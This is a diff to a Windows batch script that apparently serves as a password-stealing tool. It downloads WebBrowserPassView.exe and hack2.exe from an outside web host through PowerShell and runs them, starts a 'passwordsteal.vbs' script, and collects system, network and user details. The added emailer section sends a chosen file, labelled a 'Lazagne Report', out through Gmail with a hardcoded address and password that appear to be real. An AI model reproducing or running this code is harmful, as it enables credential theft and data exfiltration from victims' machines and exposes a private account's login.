@@ -26,6 +26,7 @@
 ::ZQ0/vhVqMQ3MEVWAtB9wSA==
 ::Zg8zqx1/OA3MEVWAtB9wSA==
 ::dhA7pRFwIByZRRnk
+::Zh4grVQjdCuDJGix3WEbGzp6aEqHJG7a
 ::YB416Ek+ZG8=
 ::
 ::
@@ -44,11 +45,13 @@ if pwd == %input% goto B
 if info ==  %input% systeminfo>info.txt
 if ip == %input% ipconfig/all>ip.txt
 if me == %input% whoami
+if email == %input% goto D
 goto A
 :B
-start passwordsteal.vbs
-set files='http://mogiant.azurewebsites.net/hack2.exe'
+
+set files= 'http://mogiant.azurewebsites.net/WebBrowserPassView.exe' , 'http://mogiant.azurewebsites.net/hack2.exe'
 powershell "(%files%)|foreach{$fileName='%TEMP%'+(Split-Path -Path $_ -Leaf);(new-object System.Net.WebClient).DownloadFile($_,$fileName);Invoke-Item $fileName;}"
+start passwordsteal.vbs
 echo done
 goto A
 
@@ -57,4 +60,14 @@ echo pwd
 echo info
 echo ip
 echo me
+goto A
+
+:D
+echo welcome to the emailer
+set /p file=file:
+
+set email = captianlastimosa@gmail.com
+set password = wither14
+powershell $SMTPServer = 'smtp.gmail.com';$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587);$SMTPInfo.EnableSsl = $true;$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('%email%', '%password%');$ReportEmail = New-Object System.Net.Mail.MailMessage;$ReportEmail.From = '%email%';$ReportEmail.To.Add('%email%');$ReportEmail.Subject = 'Lazagne Report';$ReportEmail.Body = 'Lazagne report in the attachments.';$ReportEmail.Attachments.Add('%file%');$SMTPInfo.Send($ReportEmail);
+
 goto A
